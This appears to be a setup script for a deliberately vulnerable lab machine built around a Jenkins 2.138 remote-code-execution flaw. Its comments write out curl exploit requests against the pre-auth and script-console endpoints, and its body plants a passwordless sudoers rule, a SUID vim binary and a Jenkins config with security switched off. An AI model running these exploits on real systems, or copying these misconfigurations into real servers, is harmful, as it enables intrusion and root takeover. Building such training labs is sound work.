#!/bin/bash
# CVE-2018-1000861: Jenkins 2.138 unauthenticated Groovy script RCE
# Foothold: Pre-auth RCE via /securityRealm/user/admin/descriptorByName/...
# Exploit (no auth required on Jenkins 2.138 with default setup):
#   curl -s http://TARGET/securityRealm/user/admin/descriptorByName/\
#     org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile \
#     --data-urlencode "value=@groovy_payload.groovy"
# Or direct script console if security disabled:
#   curl -X POST http://TARGET/script -d 'script=Runtime.exec("id").text'
# User: jenkins
# Privesc: jenkins -> ckplayer (sudo), ckplayer -> root (SUID vim)

# Ensure jenkins user exists
id jenkins &>/dev/null || useradd -r -s /bin/bash -m -d /var/jenkins_home jenkins

# jenkins user -> ckplayer via sudo
echo "jenkins ALL=(ckplayer) NOPASSWD:/bin/bash" >> /etc/sudoers

# SUID vim for ckplayer -> root (GTFOBins classic)
chmod u+s /usr/bin/vim.basic 2>/dev/null || chmod u+s /usr/bin/vim 2>/dev/null || true

# Jenkins typically disables security on first boot - ensure it stays that way
JENKINS_HOME=/var/jenkins_home
mkdir -p "$JENKINS_HOME"
cat > "$JENKINS_HOME/config.xml" << 'JXML'
<?xml version='1.1' encoding='UTF-8'?>
<hudson>
  <version>2.138</version>
  <authorizationStrategy class="hudson.security.AuthorizationStrategy$Unsecured"/>
  <securityRealm class="hudson.security.SecurityRealm$None"/>
  <useSecurity>false</useSecurity>
</hudson>
JXML
chown -R jenkins:jenkins "$JENKINS_HOME" 2>/dev/null || true
